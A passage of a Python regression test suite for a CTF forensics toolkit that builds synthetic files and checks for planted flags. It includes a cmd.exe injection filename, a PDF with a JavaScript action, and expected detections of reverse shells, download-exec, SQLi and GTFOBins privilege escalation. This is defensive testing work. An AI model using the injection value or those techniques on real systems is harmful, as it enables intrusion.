    # #71 office_docs: сырой поиск по PDF без pypdf (импорт блокируется
    # через sitecustomize на PYTHONPATH, даже если pypdf установлен)
    nopypdf = os.path.join(base, "nopypdf")
    os.makedirs(nopypdf)
    open(os.path.join(nopypdf, "sitecustomize.py"), "w").write(
        "import sys\n"
        "class _NoPypdf:\n"
        "    def find_spec(self, name, path=None, target=None):\n"
        "        if name == 'pypdf' or name.startswith('pypdf.'):\n"
        "            raise ImportError('pypdf blocked by selftest')\n"
        "sys.meta_path.insert(0, _NoPypdf())\n")
    import zlib as _zlib
    _flate = _zlib.compress(b"BT /F1 12 Tf (CTF{pdf_flate_search}) Tj ET")
    pdfp = os.path.join(base, "doc.pdf")
    open(pdfp, "wb").write(
        b"%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 3 0 R >> endobj\n"
        b"2 0 obj << /Length 32 >> stream\nBT (CTF{pdf_raw_search}) Tj ET\nendstream endobj\n"
        b"3 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n"
        b"4 0 obj << /Filter /FlateDecode >> stream\n" + _flate
        + b"\nendstream endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n")
    r = run("forensic/office_docs.py", pdfp, env={"PYTHONPATH": nopypdf})
    check("office_docs pdf without pypdf (#71)",
          "CTF{pdf_raw_search}" in r.stdout and "CTF{pdf_flate_search}" in r.stdout
          and "/JavaScript" in r.stdout, r.stdout[-800:] + r.stderr)

    # #72 cloud_creds: печатается значение, а не имя ключа
    credp = os.path.join(base, "app.conf")
    open(credp, "w").write("token = FAKE-test-token-0001\n")
    r = run("forensic/cloud_creds.py", credp)
    check("cloud_creds prints value (#72)", "FAKE-test-token-0001" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # #73 android_backup: флаг в shared_prefs XML и SQLite без расширения
    adump = os.path.join(base, "com.example.app")
    os.makedirs(os.path.join(adump, "shared_prefs"))
    os.makedirs(os.path.join(adump, "databases"))
    open(os.path.join(adump, "shared_prefs", "prefs.xml"), "w").write(
        "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n"
        "    <string name=\"note\">CTF{prefs_xml_flag}</string>\n</map>\n")
    import sqlite3 as _sqlite3
    _con = _sqlite3.connect(os.path.join(adump, "databases", "appdata"))
    _con.execute("create table notes(body text)")
    _con.execute("insert into notes values('CTF{sqlite_noext_flag}')")
    _con.commit()
    _con.close()
    r = run("forensic/android_backup.py", adump)
    check("android_backup xml/sqlite flags (#73)",
          "CTF{prefs_xml_flag}" in r.stdout and "CTF{sqlite_noext_flag}" in r.stdout,
          r.stdout[-800:] + r.stderr)
    # #73 apk_info: resources.arsc (UTF-16 пул строк) и assets/
    apkp = os.path.join(base, "res.apk")
    with zipfile.ZipFile(apkp, "w") as z:
        z.writestr("AndroidManifest.xml",
                   b"\x03\x00\x08\x00" + "com.example.res".encode("utf-16-le"))
        z.writestr("resources.arsc", b"\x02\x00\x0c\x00"
                   + "CTF{arsc_string_flag}".encode("utf-16-le") + b"\x00\x00")
        z.writestr("assets/blob.bin", b"\x00\x01CTF{apk_asset_flag}\x00")
    r = run("forensic/apk_info.py", apkp)
    check("apk_info resources.arsc/assets (#73)",
          "CTF{arsc_string_flag}" in r.stdout and "CTF{apk_asset_flag}" in r.stdout,
          r.stdout[-800:] + r.stderr)

    # #74 flag_hunt --pattern glob, artifact_hunt --context и скорость,
    # volatility_text --keys (API_KEY) и --grep
    hunt = os.path.join(base, "hunt")
    os.makedirs(hunt)
    open(os.path.join(hunt, "server.key"), "w").write("-----BEGIN TEST KEY-----\n")
    r = run("forensic/flag_hunt.py", hunt, "--pattern", "*.key")
    check("flag_hunt --pattern glob (#74)",
          "server.key" in r.stdout and "Traceback" not in r.stderr,
          r.stdout[-600:] + r.stderr[-600:])
    ctxf = os.path.join(base, "ctx.log")
    open(ctxf, "w").write("ctxbefore" + " ." * 40 + "\n"
                          "secret: fake-test-value-01\n"
                          + " ." * 40 + " ctxafter\n")
    r = run("forensic/artifact_hunt.py", ctxf, "--context", "1")
    check("artifact_hunt --context (#74)",
          "fake-test-value-01" in r.stdout and "ctxbefore" in r.stdout
          and "ctxafter" in r.stdout, r.stdout[-600:] + r.stderr)
    nlf = os.path.join(base, "newlines.txt")
    open(nlf, "wb").write(b"\n" * 100_000)
    try:
        r = subprocess.run([PY, os.path.join(KIT, "forensic", "artifact_hunt.py"), nlf],
                           capture_output=True, text=True, encoding="utf-8",
                           errors="replace", env=ENV, timeout=30)
        ok, detail = r.returncode == 0, r.stderr[-400:]
    except subprocess.TimeoutExpired:
        ok, detail = False, "timeout 30s: квадратичный разбор"
    check("artifact_hunt 100KB newlines fast (#74)", ok, detail)
    envf = os.path.join(base, "windows.envars.txt")
    open(envf, "w").write(
        "PID\tProcess\tBlock\tVariable\tValue\n"
        "1234\tagent.exe\t0x1\tPATH\tC:\\Windows\n"
        "1234\tagent.exe\t0x1\tAPI_KEY\tzz-test-0001\n"
        "1234\tagent.exe\t0x1\tLAB_HOST\tlab-host-01\n"
        "5678\tother.exe\t0x2\tPATH\tC:\\Other\n")
    r = run("forensic/volatility_text.py", envf, "--keys")
    check("volatility_text --keys API_KEY (#74)", "zz-test-0001" in r.stdout,
          r.stdout[-600:] + r.stderr)
    r = run("forensic/volatility_text.py", envf, "--grep", "lab-host")
    check("volatility_text --grep (#74)",
          "lab-host-01" in r.stdout and "other.exe" not in r.stdout
          and "C:\\Windows" not in r.stdout, r.stdout[-600:] + r.stderr)

def checks_stego_audio(tmp):
    # audio_spectrum: низкие частоты внизу картинки (#60)
    low_wav = os.path.join(tmp, "spec_low.wav")
    with wave.open(low_wav, "w") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(8000)
        w.writeframes(b"".join(
            struct.pack("<h", int(8000 * math.sin(2 * math.pi * 300 * i / 8000)))
            for i in range(8000)))
    low_png = os.path.join(tmp, "spec_low.png")
    r = run("stego/audio_spectrum.py", low_wav, "--out", low_png,
            "--width", "100", "--height", "100")
    row = -1
    if os.path.exists(low_png):
        _im = Image.open(low_png).convert("L")
        _rows = [sum(_im.getpixel((x, y)) for x in range(_im.width))
                 for y in range(_im.height)]
        row = _rows.index(max(_rows))
    check("stego/audio_spectrum.py low freq at bottom", row >= 80,
          f"brightest row={row}\n" + r.stdout + r.stderr)

    keys = {"1": (697, 1209), "2": (697, 1336), "3": (697, 1477), "A": (697, 1633),
            "4": (770, 1209), "5": (770, 1336), "6": (770, 1477), "B": (770, 1633),
            "7": (852, 1209), "8": (852, 1336), "9": (852, 1477), "C": (852, 1633),
            "*": (941, 1209), "0": (941, 1336), "#": (941, 1477), "D": (941, 1633)}

    def _dtmf(digits, rate, tone_s, gap_s, amp):
        out = []
        for d in digits:
            f1, f2 = keys[d]
            out += [amp * (math.sin(2 * math.pi * f1 * i / rate) +
                           math.sin(2 * math.pi * f2 * i / rate))
                    for i in range(int(rate * tone_s))]
            out += [0.0] * int(rate * gap_s)
        return out

    def _wav(path, samples, rate, width):
        lim = (1 << (8 * width - 1)) - 1
        with wave.open(path, "w") as w:
            w.setnchannels(1); w.setsampwidth(width); w.setframerate(rate)
            w.writeframes(b"".join(
                max(-lim, min(lim, int(v))).to_bytes(width, "little", signed=True)
                for v in samples))

    # audio_tools: 24-битный WAV (3 байта на сэмпл) (#61)
    p24 = os.path.join(tmp, "dtmf24.wav")
    _wav(p24, _dtmf("1234", 8000, 0.2, 0.1, 2_000_000), 8000, 3)
    r = run("stego/audio_tools.py", p24, "--mode", "dtmf")
    check("stego/audio_tools.py dtmf 24-bit", "DTMF: 1234" in r.stdout,
          r.stdout + r.stderr)

    # audio_tools: быстрый DTMF 50 мс тон / 50 мс пауза в белом шуме,
    # с повторами цифр (#62)
    import random
    _rnd = random.Random(62)
    fast = "1123581321345589"
    pfast = os.path.join(tmp, "dtmf_fast.wav")
    _wav(pfast, [v + _rnd.gauss(0, 4000) for v in _dtmf(fast, 8000, 0.05, 0.05, 8000)],
         8000, 2)
    r = run("stego/audio_tools.py", pfast, "--mode", "dtmf")
    check("stego/audio_tools.py dtmf fast+noise", f"DTMF: {fast}\n" in r.stdout,
          r.stdout + r.stderr)

    # audio_tools: морзе только из тире — точку нельзя брать из длины тонов (#63)
    def _morse(text, rate=22050, dot_s=0.08):
        table = {"M": "--", "O": "---", "T": "-"}
        dot = int(rate * dot_s)
        out = []
        for ch in text:
            for sym in table[ch]:
                out += [6000 * math.sin(2 * math.pi * 700 * i / rate)
                        for i in range(dot if sym == "." else dot * 3)]
                out += [0.0] * dot
            out += [0.0] * (dot * 2)
        return out

    for word in ("MOO", "TTT"):
        pm = os.path.join(tmp, f"morse_{word}.wav")
        _wav(pm, _morse(word), 22050, 2)
        r = run("stego/audio_tools.py", pm, "--mode", "morse", "--raw")
        check(f"stego/audio_tools.py morse dashes {word}", f"MORSE: {word}\n" in r.stdout,
              r.stdout + r.stderr)

    # qr_scan: два QR на одной картинке и прозрачный фон (#64)
    try:
        import cv2
        import numpy as np

        def _qr(text):
            q = cv2.QRCodeEncoder_create().encode(text)
            if isinstance(q, tuple):
                q = q[0]
            return cv2.resize(q, None, fx=6, fy=6, interpolation=cv2.INTER_NEAREST)

        qa, qb, qc = _qr("CTF{qr_left}"), _qr("CTF{qr_right}"), _qr("CTF{qr_alpha}")
    except Exception as e:
        qa = None
        print(f"[SKIP] stego/qr_scan.py multi/alpha: нет генератора QR в cv2 ({e})")
    if qa is not None:
        two = np.full((max(qa.shape[0], qb.shape[0]) + 40,
                       qa.shape[1] + qb.shape[1] + 80), 255, np.uint8)
        two[20:20 + qa.shape[0], 20:20 + qa.shape[1]] = qa
        two[20:20 + qb.shape[0], 60 + qa.shape[1]:60 + qa.shape[1] + qb.shape[1]] = qb
        p_two = os.path.join(tmp, "qr_two.png")
        Image.fromarray(two).save(p_two)
        r = run("stego/qr_scan.py", p_two)
        check("stego/qr_scan.py two codes",
              "CTF{qr_left}" in r.stdout and "CTF{qr_right}" in r.stdout,
              r.stdout + r.stderr)
        # тёмные модули непрозрачные, фон прозрачный (RGB под ним = 0)
        rgba = np.zeros((qc.shape[0], qc.shape[1], 4), np.uint8)
        rgba[:, :, 3] = np.where(qc < 128, 255, 0)
        p_alpha = os.path.join(tmp, "qr_alpha.png")
        Image.fromarray(rgba, "RGBA").save(p_alpha)
        r = run("stego/qr_scan.py", p_alpha)
        check("stego/qr_scan.py transparent bg", "CTF{qr_alpha}" in r.stdout,
              r.stdout + r.stderr)

    # ooxml: --strings печатает строки из всех частей, не только media (#66)
    p_docx = os.path.join(tmp, "strings.docx")
    with zipfile.ZipFile(p_docx, "w") as z:
        z.writestr("word/document.xml",
                   '<?xml version="1.0" encoding="UTF-8"?><w:document><w:body><w:p>'
                   '<w:r><w:rPr><w:vanish/></w:rPr><w:t>hidden_part_text</w:t></w:r>'
                   '</w:p></w:body></w:document>')
        z.writestr("docProps/core.xml",
                   "<cp:coreProperties><dc:subject>subject_part_text</dc:subject>"
                   "</cp:coreProperties>")
        z.writestr("customXml/item1.bin", b"\x00\x01binary_part_text\x02")
    r = run("stego/ooxml.py", p_docx, "--strings")
    marks = ("hidden_part_text", "subject_part_text", "binary_part_text")
    check("stego/ooxml.py --strings", all(m in r.stdout for m in marks),
          r.stdout[-800:] + r.stderr)
def checks_reverse(tmp):
    """Регрессии reverse/*: ghidra_decomp, disasm, megarev, lang_info, py_pack, xor_scan."""
    import time
    # #51 ghidra_decomp: имя файла не попадает в cmd.exe (поддельный analyzeHeadless.bat)
    if os.name == "nt":
        fake = os.path.join(tmp, "fake_ghidra")
        os.makedirs(fake, exist_ok=True)
        with open(os.path.join(fake, "analyzeHeadless.bat"), "w", newline="\r\n") as f:
            f.write("@echo off\necho /* ==== fake_func @ 0 */\necho ARGS: %*\n")
        inj_dir = os.path.join(tmp, "inj51")
        os.makedirs(inj_dir, exist_ok=True)
        inj = os.path.join(inj_dir, "a&echo.INJMARK51&.bin")  # без пробелов: не в кавычках
        open(inj, "wb").write(b"MZ" + b"\x00" * 62)
        r = run("reverse/ghidra_decomp.py", inj, env={"GHIDRA_HOME": fake})
        lines = [ln.strip() for ln in r.stdout.splitlines()]
        args_line = next((ln for ln in lines if ln.startswith("ARGS:")), "")
        check("ghidra_decomp: имя файла не уходит в cmd.exe",
              "fake_func" in r.stdout and "INJMARK51" not in lines
              and "input_" in args_line and "a&" not in args_line,
              r.stdout[-800:] + r.stderr)

        # #79 --keep-project оставляет проект и печатает путь
        okbin = os.path.join(inj_dir, "ok.bin")
        open(okbin, "wb").write(b"MZ" + b"\x00" * 62)
        r = run("reverse/ghidra_decomp.py", okbin, "--keep-project", env={"GHIDRA_HOME": fake})
        kept = [ln.rsplit(": ", 1)[-1].strip() for ln in r.stdout.splitlines()
                if ln.startswith("[+]") and "ghidra_proj_" in ln]
        check("ghidra_decomp --keep-project",
              bool(kept) and os.path.isdir(kept[0]), r.stdout[-800:] + r.stderr)
        for d in kept:
            if "ghidra_proj_" in os.path.basename(d):
                shutil.rmtree(d, True)

        # #79 --timeout гасит всё дерево (bat -> ping), а не ждёт его конца
        slow = os.path.join(tmp, "fake_ghidra_slow")
        os.makedirs(slow, exist_ok=True)
        with open(os.path.join(slow, "analyzeHeadless.bat"), "w", newline="\r\n") as f:
            f.write("@echo off\necho started\nping -n 20 127.0.0.1 >nul\n"
                    "echo /* ==== late @ 0 */\n")
        t0 = time.time()
        r = run("reverse/ghidra_decomp.py", okbin, "--timeout", "2", env={"GHIDRA_HOME": slow})
        took = time.time() - t0
        check("ghidra_decomp --timeout kills tree",
              took < 10 and "late" not in r.stdout, f"{took:.1f}s\n" + r.stdout[-600:] + r.stderr)
    else:
        print("[SKIP] ghidra_decomp cmd.exe: только Windows")

    # #75 disasm: ELF32 (i386) — секции читаются по 32-битной раскладке
    def elf32_i386(code, addr=0x08049000):
        shstr = b"\x00.text\x00.shstrtab\x00"
        code_off = 0x60
        shstr_off = code_off + len(code)
        shoff = (shstr_off + len(shstr) + 3) & ~3
        ehdr = struct.pack("<16sHHIIIIIHHHHHH", b"\x7fELF\x01\x01\x01" + b"\x00" * 9,
                           2, 3, 1, addr, 0, shoff, 0, 52, 0, 0, 40, 3, 2)
        shdrs = (struct.pack("<10I", *([0] * 10))
                 + struct.pack("<10I", 1, 1, 6, addr, code_off, len(code), 0, 0, 16, 0)
                 + struct.pack("<10I", 7, 3, 0, 0, shstr_off, len(shstr), 0, 0, 1, 0))
        blob = ehdr.ljust(code_off, b"\x00") + code + shstr
        return blob.ljust(shoff, b"\x00") + shdrs

    try:
        import capstone  # noqa: F401
        have_cs = True
    except Exception:
        have_cs = False
    # mov eax,0x41; cmp eax,0x42; (ff ff — не инструкция); mov ecx,0x1337; ret;
    # push ebp; mov ebp,esp; xor eax,eax; ret
    i386_code = (bytes.fromhex("b841000000" "83f842") + b"\xff\xff"
                 + bytes.fromhex("b937130000" "c3" "5589e5" "31c0" "c3"))
    elf32 = os.path.join(tmp, "i386.elf")
    open(elf32, "wb").write(elf32_i386(i386_code))
    if have_cs:
        r = run("reverse/disasm.py", elf32, "--all")
        check("disasm ELF32 i386", "0x08049000" in r.stdout and "eax, 0x41" in r.stdout,
              r.stdout[-600:] + r.stderr)
        # #76 imm-операнд подписан, мусорный байт не обрывает листинг, --func работает
        check("disasm imm + skipdata",
              "eax, 0x41 ; 'A'" in r.stdout and "ecx, 0x1337" in r.stdout,
              r.stdout[-600:] + r.stderr)
        r = run("reverse/disasm.py", elf32, "--func", "0x08049010")
        check("disasm --func",
              "push ebp" in r.stdout and "xor eax, eax" in r.stdout
              and "eax, 0x41" not in r.stdout and r.returncode == 0,
              r.stdout[-600:] + r.stderr)
    else:
        print("[SKIP] disasm ELF32/--func: нет capstone")

    # #77 megarev: pyc чужой версии — по magic (без расширения), строки из кортежей
    import importlib.util
    import py_compile
    src77 = os.path.join(tmp, "m77.py")
    open(src77, "w").write("T = ('tup_alpha_77', 'tup_beta_77')\n")
    pyc77 = os.path.join(tmp, "m77.pyc")
    py_compile.compile(src77, cfile=pyc77, doraise=True)
    blob = open(pyc77, "rb").read()
    noext = os.path.join(tmp, "m77_noext")
    open(noext, "wb").write(struct.pack("<H", 3413) + b"\r\n" + blob[4:])  # magic 3.8
    r = run("reverse/megarev.py", noext, "--no-crypto")
    check("megarev pyc foreign magic, no ext, tuple",
          "const: tup_alpha_77" in r.stdout and "const: tup_beta_77" in r.stdout,
          r.stdout[-800:] + r.stderr)

    # pyc старого формата (code-объекты 3.8 и 2.7) собирается здесь же, байтами
    def m_str(s):
        b = s.encode()
        return b"\xfa" + bytes([len(b)]) + b  # 'z' | FLAG_REF

    def m_bytes(b):
        return b"s" + struct.pack("<I", len(b)) + b

    def m_tuple(items):
        return b")" + bytes([len(items)]) + b"".join(items)

    code38 = (b"\xe3" + struct.pack("<6i", 0, 0, 0, 0, 1, 64)
              + m_bytes(b"d\x00S\x00")
              + m_tuple([b"N", m_tuple([m_str("old38_tuple_str"), b"i" + struct.pack("<i", 77)])])
              + m_tuple([m_str("old38_name")]) + m_tuple([]) + m_tuple([]) + m_tuple([])
              + m_str("x.py") + m_str("<module>") + struct.pack("<i", 1) + m_bytes(b""))
    pyc38 = os.path.join(tmp, "old38.pyc")
    open(pyc38, "wb").write(struct.pack("<H", 3413) + b"\r\n" + b"\x00" * 12 + code38)
    code27 = (b"c" + struct.pack("<4i", 0, 1, 1, 64) + m_bytes(b"d\x00\x00S")
              + b"(" + struct.pack("<I", 1) + m_bytes(b"py2_const_str")
              + m_tuple([]) + m_tuple([]) + m_tuple([]) + m_tuple([])
              + m_bytes(b"y.py") + b"t" + struct.pack("<I", 8) + b"<module>"
              + struct.pack("<i", 1) + m_bytes(b""))
    pyc27 = os.path.join(tmp, "old27.pyc")
    open(pyc27, "wb").write(struct.pack("<H", 62211) + b"\r\n" + b"\x00" * 4 + code27)
    r = run("reverse/megarev.py", pyc38, pyc27, "--no-crypto")
    check("megarev pyc 3.8/2.7 without marshal.loads",
          "const: old38_tuple_str" in r.stdout and "const: py2_const_str" in r.stdout
          and importlib.util.MAGIC_NUMBER != open(pyc38, "rb").read(4),
          r.stdout[-800:] + r.stderr)

    # #78 megarev: случайные 00 00 01 00 не считаются ICO и не вытесняют
    # настоящие вложения; настоящий ICO находится; --time соблюдается
    import random
    rnd = random.Random(78)
    png_buf = io.BytesIO()
    Image.new("RGB", (4, 4), (9, 9, 9)).save(png_buf, "PNG")
    ico_buf = io.BytesIO()
    Image.new("RGB", (16, 16), (200, 10, 10)).save(ico_buf, "ICO", sizes=[(16, 16)])
    ico_body = (b"MZ" + rnd.randbytes(200) + struct.pack("<20I", *([0x10000] * 20))
                + rnd.randbytes(3000) + png_buf.getvalue() + rnd.randbytes(100)
                + make_zip_bytes("inner.txt", b"hello") + rnd.randbytes(64)
                + ico_buf.getvalue())
    ico_noise = os.path.join(tmp, "ico_noise.bin")
    open(ico_noise, "wb").write(ico_body)
    r = run("reverse/megarev.py", ico_noise, "--no-crypto")
    check("megarev ICO false positives",
          "PNG @0x" in r.stdout and "ZIP @0x" in r.stdout and r.stdout.count("ICO @0x") == 1,
          r.stdout[-800:] + r.stderr)
    words = b" ".join(b"word%03dkey" % i for i in range(300))
    slow_bin = os.path.join(tmp, "slow_rev.bin")
    open(slow_bin, "wb").write(b"\x7fELF" + rnd.randbytes(150_000) + words + rnd.randbytes(20_000))
    t0 = time.time()
    r = run("reverse/megarev.py", slow_bin, "--time", "2")
    took = time.time() - t0
    check("megarev --time respected", took < 6 and r.returncode == 0,
          f"{took:.1f}s\n" + r.stdout[-400:] + r.stderr)

    # #80 lang_info: PNG с «logo1.png» в метаданных — не Go
    from PIL import PngImagePlugin
    logo = os.path.join(tmp, "logo1.png")
    meta = PngImagePlugin.PngInfo()
    meta.add_text("Title", "logo1.png")
    Image.new("RGB", (8, 8), (1, 2, 3)).save(logo, pnginfo=meta)
    r = run("reverse/lang_info.py", logo)
    lang_line = next((ln for ln in r.stdout.splitlines() if "language:" in ln), "")
    check("lang_info: PNG is not Go", lang_line and "Go" not in lang_line,
          r.stdout[-400:] + r.stderr)

    # #80 py_pack: zipapp со строкой #! перед zip
    import zipapp
    za_src = os.path.join(tmp, "za_src")
    os.makedirs(za_src, exist_ok=True)
    open(os.path.join(za_src, "__main__.py"), "w").write("print('hi')\n")
    pyz = os.path.join(tmp, "app.pyz")
    zipapp.create_archive(za_src, pyz, interpreter="/usr/bin/env python3")
    r = run("reverse/py_pack.py", pyz)
    check("py_pack zipapp with shebang",
          open(pyz, "rb").read(2) == b"#!" and "zipapp" in r.stdout and "__main__.py" in r.stdout,
          r.stdout[-400:] + r.stderr)

    # #80 xor_scan: 3-байтовый ключ по префиксу флага, флаг не в начале файла
    xflag = b"CTF{three_byte_key_xor}"
    xplain = b"header text before the flag: " + xflag + b" tail"
    xk = b"KEY"
    xbin = os.path.join(tmp, "xor3.bin")
    open(xbin, "wb").write(bytes(c ^ xk[i % 3] for i, c in enumerate(xplain)))
    outs = [run("reverse/xor_scan.py", xbin, *a).stdout
            for a in (("--known", "CTF{"), ("--keylen", "3"), ())]
    check("xor_scan 3-byte key from flag prefix",
          all("key=b'KEY'" in o and xflag.decode() in o for o in outs), "\n".join(outs)[-900:])
def checks_admin(tmp):
    """admin/*: образы ВМ, логи, Windows, триаж. Артефакты — tests/gen_admin.py."""
    sys.path.insert(0, os.path.join(KIT, "tests"))
    import gen_admin
    base = os.path.join(tmp, "admin")

    # #85 vm_image: QCOW2 (zlib-кластер), VDI, VMDK sparse/stream, OVA
    vms = gen_admin.write_vm_set(os.path.join(base, "vm"))
    for kind, (p, flag, raw) in vms.items():
        r = run("admin/vm_image.py", p)
        check(f"admin/vm_image.py {kind} flag", flag in r.stdout and "MBR 0x83" in r.stdout,
              r.stdout[-700:] + r.stderr[-400:])
        out = p + ".raw"
        r = run("admin/vm_image.py", p, "--raw", out)
        same = os.path.exists(out) and open(out, "rb").read() == raw
        check(f"admin/vm_image.py {kind} --raw", same, r.stdout[-500:] + r.stderr[-400:])
    r = run("admin/vm_image.py", vms["vmdk_sparse"][0], "--find", "flag.txt")
    check("admin/vm_image.py --find", "0x000000050010" in r.stdout, r.stdout[-500:])
    r = run("solve.py", vms["qcow2"][0], "--time", "40")
    check("solve.py vm image", vms["qcow2"][1] in r.stdout and "vm" in r.stdout,
          r.stdout[-700:] + r.stderr[-300:])

    # #86 log_analyze: auth.log, nginx, journald JSON, zsh history, таймлайн
    logs = gen_admin.write_log_set(os.path.join(base, "logs"))
    p, flag = logs["auth"]
    r = run("admin/log_analyze.py", p)
    check("admin/log_analyze.py auth",
          flag in r.stdout and "брутфорс удался" in r.stdout and "UID 0" in r.stdout
          and "download-exec" in r.stdout and "backdoor → group sudo" in r.stdout,
          r.stdout[-900:] + r.stderr[-400:])
    p, flag = logs["access"]
    r = run("admin/log_analyze.py", p)
    check("admin/log_analyze.py web",
          flag in r.stdout and "слепая SQLi" in r.stdout and "lfi/traversal" in r.stdout
          and "nikto" in r.stdout and "user=guest;role=admin" in r.stdout
          and "всплеск 4xx/5xx" in r.stdout, r.stdout[-900:] + r.stderr[-400:])
    p, flag = logs["journal"]
    r = run("admin/log_analyze.py", p)
    check("admin/log_analyze.py journald",
          flag in r.stdout and "journal_json" in r.stdout and "192.0.2.44" in r.stdout,
          r.stdout[-700:] + r.stderr[-400:])
    p, flag = logs["history"]
    r = run("admin/log_analyze.py", p)
    check("admin/log_analyze.py history",
          flag in r.stdout and "reverse-shell" in r.stdout and "password-arg" in r.stdout,
          r.stdout[-700:] + r.stderr[-400:])
    r = run("admin/log_analyze.py", logs["auth"][0], logs["history"][0], logs["journal"][0],
            "--timeline", "--year", "2024")
    tl = r.stdout.split("=== таймлайн", 1)[-1]
    i1, i2, i3 = tl.find("192.0.2.44"), tl.find("wget http"), tl.find("203.0.113.7: 12")
    check("admin/log_analyze.py --timeline", 0 <= i1 < i2 < i3, tl[:900] + r.stderr[-300:])
    r = run("solve.py", logs["access"][0], "--time", "40")
    check("solve.py logs", logs["access"][1] in r.stdout and "«logs»" in r.stdout,
          r.stdout[-700:] + r.stderr[-300:])

    # #87 win_admin: regf (SYSTEM/NTUSER), службы, Run, удалённое, задачи, PS-история
    win_root = os.path.join(base, "win")
    win = gen_admin.write_win_set(win_root)
    p, flag = win["ntuser"]
    r = run("admin/win_admin.py", "reg", p)
    check("admin/win_admin.py reg", flag in r.stdout and "NTUSER" in r.stdout
          and "checksum ok" in r.stdout, r.stdout[-700:] + r.stderr[-400:])
    r = run("admin/win_admin.py", "reg", p, "--deleted")
    check("admin/win_admin.py reg --deleted", win["deleted"][1] in r.stdout
          and "удалённое значение" in r.stdout, r.stdout[-700:] + r.stderr[-400:])
    r = run("admin/win_admin.py", "run", p)
    check("admin/win_admin.py run", "Updater" in r.stdout and "RunOnce" in r.stdout
          and "[!] Updater" in r.stdout, r.stdout[-700:] + r.stderr[-400:])
    p, flag = win["system"]
    r = run("admin/win_admin.py", "services", p)
    check("admin/win_admin.py services", flag in r.stdout and "[!] UpdSvc" in r.stdout
          and "-EncodedCommand" in r.stdout, r.stdout[-700:] + r.stderr[-400:])
    p, flag = win["task"]
    r = run("admin/win_admin.py", "tasks", os.path.dirname(p))
    check("admin/win_admin.py tasks", flag in r.stdout and "WIN-TEST\\admin" in r.stdout
          and "Hidden" in r.stdout and "PT15M" in r.stdout, r.stdout[-700:] + r.stderr[-400:])
    p, flag = win["pshistory"]
    r = run("admin/win_admin.py", "pshistory", p)
    check("admin/win_admin.py pshistory", flag in r.stdout and "defense-evasion" in r.stdout,
          r.stdout[-700:] + r.stderr[-400:])
    r = run("admin/win_admin.py", win_root)
    check("admin/win_admin.py auto dir", all(win[k][1] in r.stdout for k in win),
          r.stdout[-900:] + r.stderr[-400:])
    r = run("solve.py", win["system"][0], "--time", "40")
    check("solve.py winadm", win["system"][1] in r.stdout and "«winadm»" in r.stdout,
          r.stdout[-700:] + r.stderr[-300:])

    # #84 admin_triage: дамп ФС с ошибками конфигов + раздача vm/logs/winadm
    dump = os.path.join(base, "fsdump")
    dflags = gen_admin.write_linux_dump(dump)
    r = run("admin/admin_triage.py", dump)
    out = r.stdout
    must = ["toor с UID 0", "NOPASSWD /usr/bin/find — GTFOBins", "LD_PRELOAD", "wildcard-инъекция",
            "/tmp/cleanup.sh", "reverse-shell", "PermitEmptyPasswords", "no_root_squash",
            ".git-credentials: bob:", "docker.sock", "/opt/tools/backup — нестандартный",
            "cap_setuid", "sha512crypt, hashcat -m 1800", "yescrypt", "у toor пустой пароль",
            "group docker: bob", "удалён /home/bob/notes.txt"]
    miss = [m for m in must if m not in out]
    check("admin/admin_triage.py checks", not miss, f"нет: {miss}\n" + out[-900:] + r.stderr[-400:])
    check("admin/admin_triage.py dispatch", all(f in out for f in dflags.values()),
          out[-900:] + r.stderr[-400:])
    r = run("admin/admin_triage.py", os.path.join(dump, "etc", "sudoers"))
    check("admin/admin_triage.py file", "NOPASSWD" in r.stdout and "GTFOBins" in r.stdout,
          r.stdout[-600:] + r.stderr[-300:])
    r = run("solve.py", os.path.join(dump, "opt", "app", "k8s", "secret.yaml"), "--time", "40")
    check("solve.py admin config", dflags["k8s"] in r.stdout and "«admin»" in r.stdout,
          r.stdout[-700:] + r.stderr[-300:])
    r = run("solve.py", dump, "--plan")
    check("solve.py admin dir plan", "admin " in r.stdout, r.stdout[-700:] + r.stderr[-300:])
def checks_stego_img(tmp):
    """Регрессии stego: LSB-каналы, эзотерика, carve/jpeg_tail, png_chunks,
    враждебный ввод (Deadfish, bitmap_font)."""

    # lsb: классический R,G,B,R,G,B… (без альфы) находится без опций
    def _rgb_lsb_png(path, msg, mode):
        im = Image.new(mode, (64, 16), (100, 150, 200, 255)[:len(mode)])
        px = im.load()
        bits = [(b >> (7 - i)) & 1 for b in msg for i in range(8)]
        k = 0
        for y in range(im.height):
            for x in range(im.width):
                p = list(px[x, y])
                for c in range(3):
                    if k < len(bits):
                        p[c] = (p[c] & 0xFE) | bits[k]
                        k += 1
                px[x, y] = tuple(p)
        im.save(path)

    for mode in ("RGB", "RGBA"):
        want = "CTF{rgb_lsb_" + mode.lower() + "}"
        p = os.path.join(tmp, f"rgb_lsb_{mode}.png")
        _rgb_lsb_png(p, want.encode(), mode)
        r = run("stego/lsb.py", p)
        check(f"lsb rgb sequence {mode}", want in r.stdout, r.stdout[:500] + r.stderr)

    # esolang: Hello World на Ook! и COW — переводим Brainfuck по спецификациям
    bf_hello = ("++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---."
                "+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.")
    ook_of = {">": "Ook. Ook?", "<": "Ook? Ook.", "+": "Ook. Ook.", "-": "Ook! Ook!",
              ".": "Ook! Ook.", ",": "Ook. Ook!", "[": "Ook! Ook?", "]": "Ook? Ook!"}
    cow_of = {">": "moO", "<": "mOo", "+": "MoO", "-": "MOo",
              ".": "Moo", "[": "MOO", "]": "moo"}
    for lang, table in (("ook", ook_of), ("cow", cow_of)):
        p = os.path.join(tmp, f"hello.{lang}")
        with open(p, "w") as f:
            f.write("\n".join(table[c] for c in bf_hello))
        r = run("stego/esolang.py", p)
        check(f"esolang {lang} hello world",
              f"похоже на: {lang}" in r.stdout and "Hello World!" in r.stdout,
              r.stdout[-400:] + r.stderr)
    # COW без аналогов в BF: MMM (регистр), OOM/oom (числа), OOO (обнуление)
    p = os.path.join(tmp, "ops.cow")
    with open(p, "w") as f:
        f.write("MoO " * 5 + "MMM moO MMM OOM OOO OOM oom OOM")
    r = run("stego/esolang.py", p, "--input", "-42\n")
    check("esolang cow MMM/OOM/oom", "'5\\n0\\n-42\\n'" in r.stdout,
